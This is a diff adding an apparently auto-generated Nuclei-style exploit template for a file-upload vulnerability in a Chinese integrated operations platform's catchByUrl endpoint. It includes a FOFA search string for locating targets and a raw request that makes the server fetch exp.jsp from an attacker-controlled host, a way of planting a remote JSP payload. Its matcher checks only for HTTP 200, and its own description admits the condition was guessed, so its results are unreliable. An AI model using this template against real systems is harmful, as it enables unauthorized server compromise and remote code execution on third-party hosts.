@@ -1,0 +1,33 @@
+id: poc-ww5gieaiztww00cg
+info:
+  name: 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ww5gieaiztww00cg
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ww5gieaiztww00cg
+    fofa: FOFA：body="thirdparty/ueditor/WordPaster"
+http:
+- raw:
+  - 'GET /resources/files/ue/catchByUrl?url=http://vpsip/exp.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
